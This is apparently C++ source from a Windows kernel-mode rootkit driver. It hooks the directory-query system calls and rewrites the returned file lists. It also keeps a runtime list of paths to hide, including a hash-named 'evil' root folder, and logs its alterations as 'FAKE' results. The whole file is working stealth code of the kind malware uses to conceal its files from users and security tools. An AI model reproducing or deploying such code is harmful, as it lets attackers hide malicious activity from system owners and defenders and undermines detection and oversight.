#pragma once
#pragma warning(disable : 4996)
#include <wdm.h>


const char* RootDirectory = "9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097";
const WCHAR* WideRootDirectory = L"9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097";


// Definitions of functions/types:
typedef NTSTATUS(*QueryDirFile)(IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG FileInformationLength,
    IN FILE_INFORMATION_CLASS FileInformationClass,
    IN BOOLEAN ReturnSingleEntry,
    IN PUNICODE_STRING FileName OPTIONAL,
    IN BOOLEAN RestartScan);

typedef NTSTATUS(*QueryDirFileEx)(IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    IN ULONG QueryFlags,
    IN PUNICODE_STRING FileName OPTIONAL);

typedef NTSTATUS(*QuerySystemInformation)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL);


typedef NTSTATUS(*QueryInformationByName)(IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass);


// Class for handling requested files to hide:
class HideFileObject {
public:
    PVOID HideBuffer = NULL;
    ULONG HideCount = 0;
    ULONG BufferSize = 0;
    char HideDivider = L'|';


    BOOL GetFromHideFile(PUNICODE_STRING HideName, int HideIndex, ULONG* HideOffset) {
        ULONG CurrLength = 0;
        ULONG CurrHide = 0;
        ULONG UnsIndex = 0;
        if (HideIndex < 0) {
            UnsIndex = (ULONG)HideIndex + HideCount;
        }
        else {
            UnsIndex = (ULONG)HideIndex;
        }
        if (HideBuffer == NULL || HideCount == 0 || BufferSize == 0 || HideOffset == NULL) {
            return FALSE;  // Invalid parameters
        }
        if (UnsIndex >= HideCount) {
            return FALSE;
        }
        for (ULONG Index = 0; Index < BufferSize / sizeof(WCHAR); Index++) {
            if (CurrHide == UnsIndex) {
                if (((WCHAR*)HideBuffer)[Index] != L'|') {
                    if (CurrLength == 0) {
                        *HideOffset = Index * sizeof(WCHAR);
                    }
                    CurrLength += sizeof(WCHAR);
                }
                else {
                    break;
                }
            }
            else {
                if (((WCHAR*)HideBuffer)[Index] == L'|') {
                    CurrHide++;
                }
            }
        }
        HideName->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, CurrLength, 'GfHf');
        if (HideName->Buffer == NULL) {
            return FALSE;
        }
        RtlCopyMemory(HideName->Buffer, (PVOID)((ULONG64)HideBuffer + *HideOffset), CurrLength);
        HideName->Length = (USHORT)CurrLength - sizeof(WCHAR);  // UNICODE_STRING length does not include nullterminator
        HideName->MaximumLength = (USHORT)CurrLength - sizeof(WCHAR);  // UNICODE_STRING length does not include nullterminator
        return TRUE;
    }

    BOOL CheckIfSameExists(PUNICODE_STRING ComparedString) {
        UNICODE_STRING CurrentName = { 0 };
        ULONG HideOffset = 0;
        for (ULONG namei = 0; namei < HideCount; namei++) {
            if (GetFromHideFile(&CurrentName, namei, &HideOffset) && HideOffset != 0 && CurrentName.Buffer != NULL) {
                if (general_helpers::CompareUnicodeStringsADD(&CurrentName, ComparedString, 0)) {
                    return TRUE;
                }
            }
        }
        return FALSE;
    }

    BOOL AddToHideFile(PUNICODE_STRING NewHideName) {
        DWORD Count = NewHideName->Length + sizeof(WCHAR);  // Length does not include nullterminator
        PVOID TempBuffer = NULL;
        if (CheckIfSameExists(NewHideName)) {
            return TRUE;  // Path already exists, already hidden file/folder
        }
        if (HideBuffer != NULL) {
            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize, 'HfTb');
            if (TempBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(TempBuffer, HideBuffer, BufferSize);
            ExFreePool(HideBuffer);
            HideBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize + Count + sizeof(WCHAR), 'HfOl');
            if (HideBuffer == NULL) {
                ExFreePool(TempBuffer);
                return FALSE;
            }
            if (HideBuffer != NULL) {
                RtlCopyMemory(HideBuffer, TempBuffer, BufferSize);
                ExFreePool(TempBuffer);
                RtlCopyMemory((PVOID)((ULONG64)HideBuffer + BufferSize), &HideDivider, sizeof(WCHAR));
                RtlCopyMemory((PVOID)((ULONG64)HideBuffer + BufferSize + sizeof(WCHAR)), NewHideName->Buffer, Count);
                BufferSize += sizeof(WCHAR) + Count;  // Divider + next string
            }
            else {
                return FALSE;
            }
        }
        else {
            HideBuffer = ExAllocatePoolWithTag(NonPagedPool, Count, 'HfOl');
            if (HideBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(HideBuffer, NewHideName->Buffer, Count);
            BufferSize += Count;
        }
        HideCount++;
        return TRUE;
    }

    BOOL RemoveFromHideFile(int HideIndex, PUNICODE_STRING RemovedString) {
        UNICODE_STRING Removed = { 0 };
        ULONG NeededOffset = 0;
        ULONG UnsIndex = 0;
        PVOID TempBuffer = NULL;
        if (RemovedString == NULL) {
            RemovedString = &Removed;
        }
        if (HideIndex < 0) {
            UnsIndex = (ULONG)HideIndex + HideCount;
        }
        else {
            UnsIndex = (ULONG)HideIndex;
        }
        if (HideBuffer == NULL || HideCount == 0 || BufferSize == 0) {
            return FALSE;  // Invalid parameters
        }
        if (!GetFromHideFile(RemovedString, (int)UnsIndex, &NeededOffset) || RemovedString->Buffer == NULL || RemovedString->Length == 0 || RemovedString->MaximumLength == 0) {
            return FALSE;
        }
        if (HideCount == 1) {
            ExFreePool(HideBuffer);
            HideBuffer = NULL;
            BufferSize = 0;
            HideCount = 0;
            return TRUE;
        }
        if (UnsIndex == 0) {
            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize - (RemovedString->Length + 2 * sizeof(WCHAR)), 'RfHf');  // +2 for dividor and nullterminator
            if (TempBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(TempBuffer, (PVOID)((ULONG64)HideBuffer + RemovedString->Length + 2 * sizeof(WCHAR)), BufferSize - (RemovedString->Length + 2 * sizeof(WCHAR)));
            ExFreePool(HideBuffer);
            HideBuffer = TempBuffer;
            BufferSize -= (RemovedString->Length + 2 * sizeof(WCHAR));
            HideCount--;
        }
        else if (UnsIndex == HideCount - 1) {
            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, NeededOffset - sizeof(WCHAR), 'RfHf');  // -1 for the dividor before the removed
            if (TempBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(TempBuffer, HideBuffer, NeededOffset - sizeof(WCHAR));
            ExFreePool(HideBuffer);
            HideBuffer = TempBuffer;
            BufferSize = NeededOffset - sizeof(WCHAR);
            HideCount--;
        }
        else {
            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize - (RemovedString->Length + 2 * sizeof(WCHAR)), 'RfHf');
            if (TempBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(TempBuffer, HideBuffer, NeededOffset);
            RtlCopyMemory((PVOID)((ULONG64)TempBuffer + NeededOffset), (PVOID)((ULONG64)HideBuffer + NeededOffset + RemovedString->Length + 2 * sizeof(WCHAR)), BufferSize - (NeededOffset + RemovedString->Length + 2 * sizeof(WCHAR)));
            ExFreePool(HideBuffer);
            HideBuffer = TempBuffer;
            BufferSize -= (RemovedString->Length + 2 * sizeof(WCHAR));
            HideCount--;
        }
        return TRUE;
    }
};
HideFileObject HookHide;


void SearchForInitialEvilDir(PUNICODE_STRING Name, BOOL* IsRoot, BOOL* IsSame, DWORD Checks) {
    USHORT DirIndex = 0;

    if (Checks >= 1) {
        if ((strlen(RootDirectory) + 1) * (sizeof(WCHAR) / sizeof(char)) <= Name->Length) {
            *IsRoot = FALSE;  // Only other case in which changed should be made, to hide 9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097 in SystemRoot
            for (DirIndex = 0; DirIndex < strlen(RootDirectory) && *IsSame; DirIndex++) {
                if (RootDirectory[DirIndex] != Name->Buffer[DirIndex + 1]) {
                    *IsSame = FALSE;
                }
            }
            if (*IsSame) {
                if (!(Name->Buffer[DirIndex + 1] == L'\0' || Name->Buffer[DirIndex + 1] == L'\\')) {
                    *IsSame = FALSE;  // Make sure that directories like 9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d70971 wont get labeled as evil
                }
            }
        }
        else {
            *IsSame = FALSE;
            if (Checks >= 2) {
                if (!((Name->Length == sizeof(WCHAR) && Name->Buffer[0] == L'\\') || (Name->Length == sizeof(WCHAR) * 2 && Name->Buffer[0] == L'\\' && Name->Buffer[1] == L'\0'))) {
                    *IsRoot = FALSE;  // Only other case in which changed should be made, to hide 9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097 in SystemRoot
                }
            }
        }
    }
}


BOOL IsToHideRequest(PUNICODE_STRING RequestedDir, PUNICODE_STRING CurrentFile) {
    UNICODE_STRING CurrentHidden = { 0 };
    ULONG CurrentHideOffs = 0;
    ULONG CurrentSequence = 0;
    BOOL IsSame = FALSE;
    int BackSlash = -1;
    int DirIndex = 0;
    for (ULONG hiddeni = 0; hiddeni < HookHide.HideCount; hiddeni++) {
        if (!HookHide.GetFromHideFile(&CurrentHidden, hiddeni, &CurrentHideOffs)) {
            continue;  // If get failed there is nothing to search for
        }
        for (int namei = 0; namei < CurrentHidden.Length / sizeof(WCHAR); namei++) {
            if (CurrentHidden.Buffer[namei] == L'\\') {
                BackSlash = namei;
                break;
            }
        }
        if (BackSlash == -1) {
            if (CurrentHidden.Length <= RequestedDir->Length) {
                for (DirIndex = 1; DirIndex < RequestedDir->Length / sizeof(WCHAR); DirIndex++) {
                    if (CurrentSequence == CurrentHidden.Length / sizeof(WCHAR)) {
                        if (RequestedDir->Buffer[DirIndex] == L'\\') {
                            DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide exists in RequestedDir (FullPath %wZ, RequestedDir %wZ)\n",
                                &CurrentHidden, RequestedDir);
                            return TRUE;
                        }
                        else {
                            CurrentSequence = 0;
                        }
                    }
                    else {
                        if (RequestedDir->Buffer[DirIndex] != CurrentHidden.Buffer[CurrentSequence]) {
                            CurrentSequence = 0;
                        }
                        else {
                            CurrentSequence++;
                        }
                    }
                }
                if (CurrentSequence == CurrentHidden.Length / sizeof(WCHAR)) {
                    DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide exists at the end of RequestedDir (FullPath %wZ, RequestedDir %wZ)\n",
                        &CurrentHidden, RequestedDir);
                    return TRUE;  // Make sure to still check if the end of requested directory includes to hide path/file/folder
                }
                CurrentSequence = 0;
                DirIndex = 0;
            }
            if (general_helpers::CompareUnicodeStringsADD(&CurrentHidden, CurrentFile, 0)) {
                DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide is the same as CurrentFile (FullPath %wZ, CurrentFile %wZ)\n",
                    &CurrentHidden, CurrentFile);
                return TRUE;
            }
            continue;
        }
        else {
            if (general_helpers::ComparePathFileToFullPathADD(&CurrentHidden, RequestedDir, CurrentFile)) {
                DbgPrintEx(0, 0, "KMDFdriver Hooking - File path + name in linked list = one of the to-hide paths (%wZ + %wZ = %wZ)\n", RequestedDir, CurrentFile, &CurrentHidden);
                return TRUE;  // If file path + name in linked list = one of the to-hide paths
            }


            // Check if path starts with hiding path to verify last case of exact/inner request for hidden file/folder:
            if (CurrentHidden.Length <= RequestedDir->Length) {
                for (DirIndex = 0; DirIndex < CurrentHidden.Length / sizeof(WCHAR) && IsSame; DirIndex++) {
                    if (CurrentHidden.Buffer[DirIndex] != RequestedDir->Buffer[DirIndex]) {
                        IsSame = FALSE;
                    }
                }
                if (IsSame) {
                    if (RequestedDir->Buffer[DirIndex] == L'\0' || RequestedDir->Buffer[DirIndex] == L'\\') {
                        DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide starts/is equal to RequestedDir (FullPath %wZ, RequestedDir %wZ)\n",
                            &CurrentHidden, RequestedDir);  // Make sure that directories like 9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d70971 wont get labeled as evil
                        return TRUE;  // Comparison got to the end of RequestDir - until the end, it was equal
                    }
                }
                DirIndex = 0;
                IsSame = FALSE;
            }
        }
        BackSlash = -1;
    }
    return FALSE;
}


// Macro for iterating over files in NtQueryDirectory/Ex:
NTSTATUS IterateOverFiles(FILE_INFORMATION_CLASS FileInfoClass, PVOID FileInformation, IO_STATUS_BLOCK* DirStatus, BOOL* IsDirSame, PUNICODE_STRING RequestedDir, BOOL* IsSystemRoot, PUNICODE_STRING SusFolder, PUNICODE_STRING FunctionName) {
    ULONG FileCount = 0;
    ULONG IndexDecr = 0;
    UNICODE_STRING CurrentFile = { 0 };

    PFILE_ID_BOTH_DIR_INFORMATION PreviousBothId = { 0 };
    PFILE_ID_BOTH_DIR_INFORMATION CurrBothId = { 0 };
    PFILE_BOTH_DIR_INFORMATION PreviousBoth = { 0 };
    PFILE_BOTH_DIR_INFORMATION CurrBoth = { 0 };
    PFILE_ID_FULL_DIR_INFORMATION PreviousFullId = { 0 };
    PFILE_ID_FULL_DIR_INFORMATION CurrFullId = { 0 };
    PFILE_FULL_DIR_INFORMATION PreviousFull = { 0 };
    PFILE_FULL_DIR_INFORMATION CurrFull = { 0 };
    PVOID PreviousCurrent = NULL;  // Used to verify if while should end
    const WCHAR* PythonPath = L"\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython";
    const WCHAR* UtilitiesPath = L"\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\ExtraTools";


    // Check if query includes python/extra tool files that should not be blocked:
    if ((RtlCompareMemory(RequestedDir->Buffer, PythonPath, wcslen(PythonPath)) == wcslen(PythonPath) && 
        wcslen(RequestedDir->Buffer) >= wcslen(PythonPath)) ||
        (RtlCompareMemory(RequestedDir->Buffer, UtilitiesPath, wcslen(UtilitiesPath)) == wcslen(UtilitiesPath) &&
        wcslen(RequestedDir->Buffer) >= wcslen(UtilitiesPath))) {
        DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
        DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ: %wZ, query path starts with ..\\ExtraTools / ..\\MinPython\n",
            FunctionName, RequestedDir);
        DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
        return STATUS_SUCCESS;
    }
    

    // Cast parameters and call by type:
    switch (FileInfoClass) {
    case FileIdBothDirectoryInformation:
        CurrBothId = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
        PreviousCurrent = (PVOID)CurrBothId;
        PreviousBothId = CurrBothId;
        while ((ULONG64)CurrBothId != (ULONG64)PreviousCurrent || FileCount == 0) {
            CurrBothId->FileIndex -= IndexDecr;
            CurrentFile.Buffer = CurrBothId->FileName;
            CurrentFile.Length = (USHORT)CurrBothId->FileNameLength;
            CurrentFile.MaximumLength = (USHORT)CurrBothId->FileNameLength;  
            if (*IsDirSame || general_helpers::CompareUnicodeStringsADD(&CurrentFile, SusFolder, 0) && *IsSystemRoot || IsToHideRequest(RequestedDir, &CurrentFile)) {
                if (CurrBothId->NextEntryOffset == 0) {
                    if (FileCount == 0) {
                        DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                        DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ BOTHID,SINGLE: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                        DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                        FileInformation = NULL;
                        DirStatus->Status = STATUS_NO_SUCH_FILE;
                        return STATUS_NO_SUCH_FILE;
                    }
                    // Last file in the linked list:
                    PreviousBothId->NextEntryOffset = 0;
                }
                else {
                    PreviousBothId->NextEntryOffset = PreviousBothId->NextEntryOffset + CurrBothId->NextEntryOffset;
                }
                DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ BOTHID: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                IndexDecr++;
            }
            else {
                PreviousBothId = CurrBothId;  // If CurrFile was hidden previous needs to stay in place
            }
            PreviousCurrent = (PVOID)CurrBothId;
            CurrBothId = (PFILE_ID_BOTH_DIR_INFORMATION)((ULONG64)CurrBothId + CurrBothId->NextEntryOffset);
            FileCount++;
        }
        break;

    case FileBothDirectoryInformation:
        CurrBoth = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
        PreviousCurrent = (PVOID)CurrBoth;
        PreviousBoth = CurrBoth;
        while ((ULONG64)CurrBoth != (ULONG64)PreviousCurrent || FileCount == 0) {
            CurrBoth->FileIndex -= IndexDecr;
            CurrentFile.Buffer = CurrBoth->FileName;
            CurrentFile.Length = (USHORT)CurrBoth->FileNameLength;
            CurrentFile.MaximumLength = (USHORT)CurrBoth->FileNameLength;
            if (*IsDirSame || general_helpers::CompareUnicodeStringsADD(&CurrentFile, SusFolder, 0) && *IsSystemRoot || IsToHideRequest(RequestedDir, &CurrentFile)) {
                if (CurrBoth->NextEntryOffset == 0) {
                    if (FileCount == 0) {
                        DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                        DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ BOTH,SINGLE: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                        DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                        FileInformation = NULL;
                        DirStatus->Status = STATUS_NO_SUCH_FILE;
                        return STATUS_NO_SUCH_FILE;
                    }
                    // Last file in the linked list:
                    PreviousBoth->NextEntryOffset = 0;
                }
                else {
                    PreviousBoth->NextEntryOffset = PreviousBoth->NextEntryOffset + CurrBoth->NextEntryOffset;
                }
                DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ BOTH: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                IndexDecr++;
            }
            else {
                PreviousBoth = CurrBoth;  // If CurrFile was hidden previous needs to stay in place
            }
            PreviousCurrent = (PVOID)CurrBoth;
            CurrBoth = (PFILE_BOTH_DIR_INFORMATION)((ULONG64)CurrBoth + CurrBoth->NextEntryOffset);
            FileCount++;
        }
        break;

    case FileIdFullDirectoryInformation:
        CurrFullId = (PFILE_ID_FULL_DIR_INFORMATION)FileInformation;
        PreviousCurrent = (PVOID)CurrFullId;
        PreviousFullId = CurrFullId;
        while ((ULONG64)CurrFullId != (ULONG64)PreviousCurrent || FileCount == 0) {
            CurrFullId->FileIndex -= IndexDecr;
            CurrentFile.Buffer = CurrFullId->FileName;
            CurrentFile.Length = (USHORT)CurrFullId->FileNameLength;
            CurrentFile.MaximumLength = (USHORT)CurrFullId->FileNameLength;
            if (*IsDirSame || general_helpers::CompareUnicodeStringsADD(&CurrentFile, SusFolder, 0) && *IsSystemRoot || IsToHideRequest(RequestedDir, &CurrentFile)) {
                if (CurrFullId->NextEntryOffset == 0) {
                    if (FileCount == 0) {
                        DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                        DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ FULLID,SINGLE: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                        DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                        FileInformation = NULL;
                        DirStatus->Status = STATUS_NO_SUCH_FILE;
                        return STATUS_NO_SUCH_FILE;
                    }
                    // Last file in the linked list:
                    PreviousFullId->NextEntryOffset = 0;
                }
                else {
                    PreviousFullId->NextEntryOffset = PreviousFullId->NextEntryOffset + CurrFullId->NextEntryOffset;
                }
                DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ FULLID: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                IndexDecr++;
            }
            else {
                PreviousFullId = CurrFullId;  // If CurrFile was hidden previous needs to stay in place
            }
            PreviousCurrent = (PVOID)CurrFullId;
            CurrFullId = (PFILE_ID_FULL_DIR_INFORMATION)((ULONG64)CurrFullId + CurrFullId->NextEntryOffset);
            FileCount++;
        }
        break;

    case FileFullDirectoryInformation:
        CurrFull = (PFILE_FULL_DIR_INFORMATION)FileInformation;
        PreviousCurrent = (PVOID)CurrFull;
        PreviousFull = CurrFull;
        while ((ULONG64)CurrFull != (ULONG64)PreviousCurrent || FileCount == 0) {
            CurrFull->FileIndex -= IndexDecr;
            CurrentFile.Buffer = CurrFull->FileName;
            CurrentFile.Length = (USHORT)CurrFull->FileNameLength;
            CurrentFile.MaximumLength = (USHORT)CurrFull->FileNameLength;
            if (*IsDirSame || general_helpers::CompareUnicodeStringsADD(&CurrentFile, SusFolder, 0) && *IsSystemRoot || IsToHideRequest(RequestedDir, &CurrentFile)) {
                if (CurrFull->NextEntryOffset == 0) {
                    if (FileCount == 0) {
                        DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                        DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ FULL,SINGLE: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                        DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                        FileInformation = NULL;
                        DirStatus->Status = STATUS_NO_SUCH_FILE;
                        return STATUS_NO_SUCH_FILE;
                    }
                    // Last file in the linked list:
                    PreviousFull->NextEntryOffset = 0;
                }
                else {
                    PreviousFull->NextEntryOffset = PreviousFull->NextEntryOffset + CurrFull->NextEntryOffset;
                }
                DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
                DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ FULL: %wZ, found file %wZ with initial directory of nosusfolder/root\n", FunctionName, RequestedDir, CurrentFile);
                DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
                IndexDecr++;
            }
            else {
                PreviousFull = CurrFull;  // If CurrFile was hidden previous needs to stay in place
            }
            PreviousCurrent = (PVOID)CurrFull;
            CurrFull = (PFILE_FULL_DIR_INFORMATION)((ULONG64)CurrFull + CurrFull->NextEntryOffset);
            FileCount++;
        }
        break;
    default: return STATUS_INVALID_PARAMETER;
    }
    return STATUS_SUCCESS;
}